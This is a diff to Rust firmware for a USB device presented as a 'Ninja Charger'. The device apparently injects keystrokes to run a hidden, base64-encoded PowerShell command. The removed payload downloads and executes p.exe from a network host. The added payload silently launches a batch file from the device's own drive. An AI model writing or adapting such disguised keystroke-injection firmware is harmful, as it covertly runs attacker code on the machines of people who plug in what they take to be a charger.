@@ -52,7 +52,7 @@ fn main() -> ! {
     let mut dev = UsbDeviceBuilder::new(&usb_bus, UsbVidPid(0x1209, 0x0001))
         .manufacturer("Acme").product("Ninja Charger").serial_number("NINJA001").build();
 
-    const CMD: &str = "powershell -w hidden -EncodedCommand SQBiAHcAcgAgAC0AVQBzZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQAwADAALwBwAC4AZQB4AGUAOwAgAFsAaQBlAHgAIAAkAGIAXQA=\n";
+    const CMD: &str = "powershell -w hidden -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEYAaQBsAGUAUABhAHQAaAAgACcARAA6AFwAcwB0AGEAcgB0AC4AYgBhAHQAJwA=\n";
     let mut sent_gui = false;
     let mut pos = 0;
     let mut rng: u32 = 0xDEADBEEF;
